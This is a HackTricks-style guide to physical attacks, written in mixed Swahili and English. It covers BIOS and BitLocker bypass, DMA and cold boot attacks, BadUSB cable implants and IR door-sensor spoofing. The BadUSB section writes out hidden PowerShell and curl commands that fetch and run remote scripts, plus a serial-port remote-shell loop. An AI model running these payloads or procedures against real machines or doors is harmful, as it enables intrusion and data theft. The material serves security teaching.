# Mashambulizi ya Kimwili

{{#include ../banners/hacktricks-training.md}}

## Urejeshaji wa Nenosiri la BIOS na Usalama wa Mfumo

**Kurejesha BIOS** kunaweza kufikiwa kwa njia kadhaa. Most motherboards include a **betri** ambayo, ikiondolewa kwa takriban **dakika 30**, itarejesha mipangilio ya BIOS, ikiwa ni pamoja na nenosiri. Vinginevyo, **jumper on the motherboard** unaweza kurekebishwa ili kurejesha mipangilio hii kwa kuunganisha pini maalum.

Kwa hali ambapo marekebisho ya vifaa havitengeki au si vitendo, **software tools** hutoa suluhisho. Kuendesha mfumo kutoka kwa **Live CD/USB** na distributions kama **Kali Linux** kunatoa ufikiaji wa zana kama **_killCmos_** na **_CmosPWD_**, ambazo zinaweza kusaidia katika urejeshaji wa nenosiri la BIOS.

Katika kesi ambapo nenosiri la BIOS halijulikani, kuingiza kwa makosa **mara tatu** kawaida husababisha msimbo wa hitilafu. Msimbo huu unaweza kutumika kwenye tovuti kama [https://bios-pw.org](https://bios-pw.org) ili kupata nenosiri linaloweza kutumika.

### Usalama wa UEFI

Kwa mifumo ya kisasa inayotumia **UEFI** badala ya BIOS ya jadi, zana **chipsec** inaweza kutumika kuchambua na kubadilisha mipangilio ya UEFI, ikiwa ni pamoja na kuzima **Secure Boot**. Hii inaweza kufanywa kwa amri ifuatayo:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM inahifadhi data kwa muda mfupi baada ya umeme kuzimwa, kawaida kwa **1 hadi 2 dakika**. Udumu huu unaweza kupanuliwa hadi **10 dakika** kwa kutumia vitu baridi, kama nitrojeni kioevu. Wakati wa kipindi hiki kilichoongezwa, inaweza kuundwa **memory dump** kwa kutumia zana kama **dd.exe** na **volatility** kwa uchambuzi.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** ni zana iliyoundwa kwa ajili ya **physical memory manipulation** kupitia DMA, inayoendana na interfaces kama **FireWire** na **Thunderbolt**. Inaruhusu kupita taratibu za kuingia kwa kutengeneza memory ili ikubali nenosiri lolote. Hata hivyo, haitafanya kazi dhidi ya mifumo ya **Windows 10**.

---

## Live CD/USB for System Access

Kubadilisha binaries za mfumo kama **_sethc.exe_** au **_Utilman.exe_** kwa nakala ya **_cmd.exe_** kunaweza kutoa prompt ya amri yenye vibali vya system. Zana kama **chntpw** zinaweza kutumika kuhariri faili ya **SAM** ya usakinishaji wa Windows, kuruhusu mabadiliko ya nenosiri.

**Kon-Boot** ni zana inayorahisisha kuingia kwenye mifumo ya Windows bila kujua nenosiri kwa kubadilisha kwa muda kernel ya Windows au UEFI. Taarifa zaidi inapatikana kwenye [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Fikia mipangilio ya BIOS.
- **F8**: Ingia katika Recovery mode.
- Kubonyeza **Shift** baada ya bendera ya Windows kunaweza kuepuka autologon.

### BAD USB Devices

Vifaa kama **Rubber Ducky** na **Teensyduino** hutumika kama majukwaa ya kutengeneza **bad USB** devices, zinazoweza kutekeleza payload zilizopangwa kabla zinapounganishwa kwenye kompyuta lengwa.

### Volume Shadow Copy

Vibali vya Administrator vinaruhusu uundaji wa nakala za faili nyeti, ikiwa ni pamoja na faili ya **SAM**, kupitia PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants such as **Evil Crow Cable Wind** hide inside USB-A→USB-C or USB-C↔USB-C cables, enumerate purely as a USB keyboard, and expose their C2 stack over Wi-Fi. The operator only needs to power the cable from the victim host, create a hotspot named `Evil Crow Cable Wind` with password `123456789`, and browse to [http://cable-wind.local/](http://cable-wind.local/) (or its DHCP address) to reach the embedded HTTP interface.
- The browser UI provides tabs for *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, and *Config*. Stored payloads are tagged per OS, keyboard layouts are switched on the fly, and VID/PID strings can be altered to mimic known peripherals.
- Because the C2 lives inside the cable, a phone can stage payloads, trigger execution, and manage Wi-Fi credentials without touching the host OS—ideal for short dwell-time physical intrusions.

### OS-aware AutoExec payloads

- AutoExec rules bind one or more payloads to fire immediately after USB enumeration. The implant performs lightweight OS fingerprinting and selects the matching script.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa sababu utekelezaji ni usioambatana, kubadilisha tu nyaya ya kuchaji kunaweza kupata ufikiaji wa awali wa “plug-and-pwn” chini ya muktadha wa mtumiaji aliyesajiliwa.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Payload iliyohifadhiwa hufungua konsoli na ku-bandika loop inayotekeleza chochote kinachofika kwenye kifaa kipya cha USB serial. A minimal Windows variant is:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant inashikilia chaneli ya USB CDC wazi huku ESP32-S3 yake ikizindua TCP client (Python script, Android APK, au desktop executable) ili kuwasiliana na operator. Bytes yoyote zinazoingizwa kwenye kikao cha TCP zinapelekwa ndani ya serial loop hapo juu, zikiruhusu remote command execution hata kwenye hosts zilizo air-gapped. Matokeo ni ya mdogo, kwa hivyo operators kwa kawaida hufanya blind commands (account creation, staging additional tooling, n.k.).

### Uso wa masasisho ya HTTP OTA

- Web stack ile ile kwa kawaida huonyesha unauthenticated firmware updates. Evil Crow Cable Wind husikiliza `/update` na huflash binary yoyote inayopakiwa:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Waendeshaji wa uwanja wanaweza kufanya hot-swap ya vipengele (kwa mfano, flash USB Army Knife firmware) wakati wa operesheni bila kufungua kebo, kuruhusu implant kubadilisha uwezo wakati bado imeunganishwa na mwenyeji wa lengo.

## Bypassing BitLocker Encryption

BitLocker encryption inaweza kuepukika ikiwa **recovery password** itapatikana ndani ya faili ya dump ya kumbukumbu (**MEMORY.DMP**). Zana kama **Elcomsoft Forensic Disk Decryptor** au **Passware Kit Forensic** zinaweza kutumika kwa lengo hili.

---

## Social Engineering for Recovery Key Addition

BitLocker recovery key mpya inaweza kuongezwa kupitia mbinu za Social Engineering, kwa kumshawishi mtumiaji kutekeleza amri inayoongeza recovery key mpya iliyotengenezwa kwa sifuri, hivyo kurahisisha mchakato wa decryption.

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Laptop nyingi za kisasa na desktops ndogo za small-form-factor zina **chassis-intrusion switch** ambayo inafuatiliwa na Embedded Controller (EC) na firmware ya BIOS/UEFI. Wakati sababu kuu ya switch ni kutoa onyo wakati kifaa kinapofunguliwa, wauzaji mara nyingine hufanya **undocumented recovery shortcut** inayochochewa wakati switch inapobadilishwa kwa muundo maalum.

### Jinsi Shambulio Linavyofanya Kazi

1. Switch imeunganishwa kwenye **GPIO interrupt** ya EC.
2. Firmware inayotumia EC inafuatilia **muda na idadi ya bonyezo**.
3. Wakati muundo uliowekwa imara unatambuliwa, EC huitegesha utaratibu wa *mainboard-reset* ambao **hufuta yaliyomo ndani ya system NVRAM/CMOS**.
4. Katika boot inayofuata, BIOS inaleta thamani za default – **supervisor password, Secure Boot keys, na usanidi wote maalum unafutwa**.

> Mara tu Secure Boot itakapozimwa na firmware password itakapofutika, mshambuliaji anaweza tu kuboot picha yoyote ya OS ya nje na kupata ufikiaji usiozuiliwa kwa diski za ndani.

### Mfano wa Uhalisia – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Baada ya mzunguko wa kumi EC huweka bendera inayoelekeza BIOS kufuta NVRAM wakati wa reboot ifuatayo. Utaratibu mzima unachukua takriban ~40 s na hauhitaji **hakuna kingine isipokuwa screwdriver**.

### Generic Exploitation Procedure

1. Zima au fufua (suspend-resume) kifaa ili EC iweze kuendesha.
2. Ondoa kifuniko cha chini ili kuonyesha switch ya intrusion/maintenance.
3. Rudisha muundo wa toggle wa muuzaji (angaliza nyaraka, forums, au fanyia reverse-engineer firmware ya EC).
4. Rekebisha tena na reboot – kinga za firmware zinapaswa kuzimwa.
5. Boot live USB (k.m. Kali Linux) na fanya post-exploitation ya kawaida (credential dumping, data exfiltration, implanting malicious EFI binaries, n.k.).

### Detection & Mitigation

* Log chassis-intrusion events katika OS management console na wekeze pamoja na unexpected BIOS resets.
* Tumia **vifungaji vinavyoonyesha kuvurugika (tamper-evident seals)** kwenye screws/covers ili kugundua kufunguliwa.
* Weka vifaa katika **maeneo yaliyodhibitiwa kimwili**; chukua dhana kwamba ufikiaji wa kimwili unamaanisha kompromisi kamili.
* Iwapo inapatikana, zima kipengele cha muuzaji cha “maintenance switch reset” au weka mahitaji ya idhini ya ziada ya kriptografia kwa NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors zina couple ya near-IR LED emitter na TV-remote style receiver module ambayo inaripoti logic high tu baada ya kuona pulses kadhaa (~4–10) za carrier sahihi (≈30 kHz).
- Plastic shroud inazuia emitter na receiver kuangalia moja kwa moja, hivyo controller inachukulia carrier iliyothibitishwa ilitoka kwa reflection ya karibu na inaendesha relay ambayo inafungua door strike.
- Mara controller inapoamini kuwa lengo lipo mara nyingi hubadilisha outbound modulation envelope, lakini receiver inaendelea kukubali burst yoyote inayolingana na filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – ungeuza logic analyser kwenye pini za controller ili kurekodi waveforms za kabla ya upatikanaji (pre-detection) na baada ya upatikanaji (post-detection) ambazo zinaendesha IR LED ya ndani.
2. **Replay only the “post-detection” waveform** – toa/puuza stock emitter na endesha external IR LED kwa sample iliyoshirikishwa tayari kutoka mwanzo. Kwa sababu receiver inajali tu pulse count/frequency, hutambua spoofed carrier kama reflection halisi na kuamsha relay line.
3. **Gate the transmission** – tuma carrier katika bursts zilizo vizuri (k.m., miongo kadhaa ya milliseconds kuwashwa, zile zile kuzimwa) ili kutoa pulse count ya chini bila kusababisha saturation ya AGC ya receiver au logic ya kushughulikia interference. Emission ya muda mrefu hufanya sensor isiwe nyeti na kuzuia relay ishike.

### Long-Range Reflective Injection
- Kubadilisha bench LED kwa high-power IR diode, MOSFET driver, na focusing optics kunawezesha kuchochea kwa ufanisi kutoka ~6 m.
- Mshambuliaji haitaji line-of-sight hadi receiver aperture; kuelekeza mionzi kwenye kuta za ndani, rafu, au vifungo vya mlango vinavyoonekana kupitia glasi huruhusu nishati inayorefleka kuingia kwenye ~30° field of view na kuiga wave-to-exit ya karibu.
- Kwa sababu receivers zinatarajia reflections dhaifu, beam ya nguvu zaidi kutoka nje inaweza kuruka kwenye uso nyingi na bado kubaki juu ya threshold ya utambuzi.

### Weaponised Attack Torch
- Kuingiza driver ndani ya flashlight ya kibiashara kunaficha zana kwa uwazi. Badilisha visible LED kwa high-power IR LED iliyoendana na bendi ya receiver, ongeza ATtiny412 (au sawa) kuunda ≈30 kHz bursts, na tumia MOSFET kusimamia current ya LED.
- Lens ya telescopic zoom inapanua beam kwa range/precision, wakati vibration motor chini ya udhibiti wa MCU inatoa uthibitisho wa haptic kuwa modulation iko hai bila kutoa mwanga unaoonekana.
- Kupitia mifumo kadhaa ya modulation zilizohifadhiwa (maboresho madogo ya carrier frequencies na envelopes) huongeza ulinganifu kwa familia tofauti za sensors, hukuruhusu kutambaza uso zenye reflection hadi relay ipige klik na mlango uachiliwe.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
